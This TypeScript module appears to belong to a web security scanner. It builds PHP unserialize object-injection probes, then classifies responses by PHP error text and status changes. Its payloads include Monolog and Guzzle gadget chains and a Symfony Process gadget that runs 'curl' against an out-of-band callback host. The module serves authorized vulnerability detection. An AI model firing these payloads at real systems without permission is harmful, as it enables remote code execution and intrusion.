// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'deserialization-php',
  family: 'deserialization',
  title: 'PHP unserialize object injection',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: true,
  requiresBrowser: false,
  insertionPointKinds: ['body', 'cookie', 'query'],
  expectedSignals: ['oast-callback-confirmed', 'error-disclosure', 'status-delta'],
  cwe: [502],
};

export function variants(ctx: ProbeContext): PayloadVariant[] {
  const oastHost = ctx.oastBaseUrl ? new URL(ctx.oastBaseUrl).hostname : 'oast.pf.example';
  return [
    {
      id: 'deser-php-basic-object',
      family: 'deserialization',
      value: 'O:8:"stdClass":1:{s:3:"pf1";s:4:"test";}',
      encoding: 'raw',
      intent: 'PHP serialized stdClass — detect unserialize() call via object accepted',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure', 'status-delta'],
    },
    {
      id: 'deser-php-phar',
      family: 'deserialization',
      value: 'phar://pf-probe.phar/test',
      encoding: 'raw',
      intent: 'PHAR stream wrapper deserialization trigger via file function',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure'],
    },
    {
      id: 'deser-php-magic-wakeup',
      family: 'deserialization',
      value: 'O:8:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\\x00*\\x00socket";O:29:"Monolog\\Handler\\BufferHandler":7:{}}',
      encoding: 'raw',
      intent: 'Monolog gadget chain — __wakeup/__destruct via Logger classes',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure', 'status-delta'],
    },
    {
      id: 'deser-php-oast-ssrf',
      family: 'deserialization',
      value: `O:13:"GuzzleHttp\\Psr7\\FnStream":2:{s:33:"\\x00GuzzleHttp\\Psr7\\FnStream\\x00methods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\\Psr7\\Request":3:{s:10:"\\x00*\\x00headers";a:1:{s:4:"Host";a:1:{i:0;s:${oastHost.length}:"${oastHost}";}}}}}`,
      encoding: 'raw',
      intent: 'Guzzle gadget SSRF chain — HTTP request to OAST on deserialization',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'deser-php-yii-oast',
      family: 'deserialization',
      value: `C:27:"Symfony\\Component\\Process\\Process":64:{s:${oastHost.length + 20}:"curl http://${oastHost}/pf-rce";}`,
      encoding: 'raw',
      intent: 'Yii/Symfony Process gadget — shell execution via OAST',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'deser-php-invalid',
      family: 'deserialization',
      value: 'O:99:"PFPROBE":1:{s:4:"test";N;}',
      encoding: 'raw',
      intent: 'Non-existent class — triggers PHP unserialize error/warning if endpoint calls unserialize()',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure'],
    },
    {
      id: 'deser-php-url-encoded',
      family: 'deserialization',
      value: encodeURIComponent('O:8:"stdClass":1:{s:3:"pf1";s:4:"test";}'),
      encoding: 'url',
      intent: 'URL-encoded PHP serialized object for cookie/query delivery',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const body = resp.bodyText.toLowerCase();
  const phpError = body.includes('unserialize') || body.includes('class not found') ||
    body.includes('notice:') || body.includes('fatal error') || body.includes('php');

  if (variant.requiresOast) {
    responseClass = 'neutral-or-not-parsed';
    confidence = 0.2;
    nextAction = 'continue';
    evidence.push('OAST probe dispatched — awaiting callback');
  } else if (phpError && resp.statusCode !== baseline.statusCode) {
    responseClass = 'parser-error';
    confidence = 0.78;
    nextAction = 'confirm';
    evidence.push('PHP error message detected in response after deserialization probe');
  } else if (phpError) {
    responseClass = 'parser-error';
    confidence = 0.55;
    nextAction = 'confirm';
    evidence.push('PHP-like error in response; may indicate unserialize() processed the payload');
  } else if (resp.statusCode !== baseline.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.35;
    nextAction = 'continue';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode}`);
  } else {
    nextAction = 'stop-negative';
    evidence.push('No PHP deserialization signal');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
